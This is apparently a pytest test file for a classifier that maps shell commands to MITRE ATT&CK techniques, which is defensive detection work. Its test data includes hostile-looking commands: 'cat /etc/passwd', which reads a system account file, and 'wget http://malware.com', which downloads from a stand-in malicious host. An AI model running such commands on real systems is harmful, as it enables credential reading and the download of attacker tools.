import json
from typing import Any, Dict
from unittest.mock import patch

import pytest

from cyanide.ml.classifier import KnowledgeBase


@pytest.fixture
def kb():
    return KnowledgeBase()


def test_kb_init(kb):
    assert kb.is_built is False
    assert len(kb.command_corpus) == 0


def test_kb_process_mapping_line(kb):
    line = json.dumps(
        {
            "input": "ls -la",
            "output": "T1083 - File and Directory Discovery",
            "metadata": {"source": "manual_mapping"},
        }
    )
    kb._process_mapping_line(line)
    assert len(kb.command_corpus) == 1
    assert kb.command_metadata[0]["technique_id"] == "T1083"
    assert kb.command_metadata[0]["technique_name"] == "File and Directory Discovery"


def test_kb_load_jsonl_db(kb, tmp_path):
    db_file = tmp_path / "test.jsonl"
    with open(db_file, "w") as f:
        f.write(json.dumps({"id": "T1083", "name": "Discovery"}) + "\n")

    db_dict: Dict[str, Any] = {}
    kb._load_jsonl_db(db_file, db_dict)
    assert "T1083" in db_dict
    assert db_dict["T1083"]["name"] == "Discovery"


def test_kb_build_index(kb):
    kb.command_corpus = ["ls", "cd", "rm"]
    kb.build_index()
    assert kb.is_built is True
    assert kb.tfidf_matrix is not None


def test_kb_search_empty(kb):
    results = kb.search("ls")
    assert results == []


def test_kb_search_basic(kb):
    kb.command_corpus = ["ls -la", "cat /etc/passwd"]
    kb.command_metadata = [
        {"technique_id": "T1083", "technique_name": "Discovery", "metadata": {}},
        {"technique_id": "T1005", "technique_name": "Collection", "metadata": {}},
    ]
    kb.technique_db = {
        "T1083": {"name": "Discovery", "answer": "Desc1", "tactics": ["discovery"]},
        "T1005": {"name": "Collection", "answer": "Desc2", "tactics": ["collection"]},
    }
    kb.build_index()

    results = kb.search("ls -la")
    assert len(results) > 0
    assert results[0]["technique_id"] == "T1083"


def test_kb_fallback_classify(kb):
    kb.technique_db = {"T1105": {"name": "Ingress Tool Transfer"}}
    result = kb._fallback_classify("wget http://malware.com")
    assert result["classified"] is True
    assert result["technique"]["id"] == "T1105"


@patch("joblib.dump")
def test_kb_save(mock_dump, kb, tmp_path):
    save_path = tmp_path / "kb.pkl"
    kb.save(save_path)
    mock_dump.assert_called_once()


@patch("joblib.load")
def test_kb_load(mock_load, kb, tmp_path):
    load_path = tmp_path / "kb.pkl"
    # Create the file structure to avoid FileNotFoundError in open()
    load_path.write_bytes(b"dummy")
    mock_load.return_value = {"is_built": True, "command_corpus": ["test"]}
    kb.load(load_path)
    assert kb.is_built is True
    assert kb.command_corpus == ["test"]
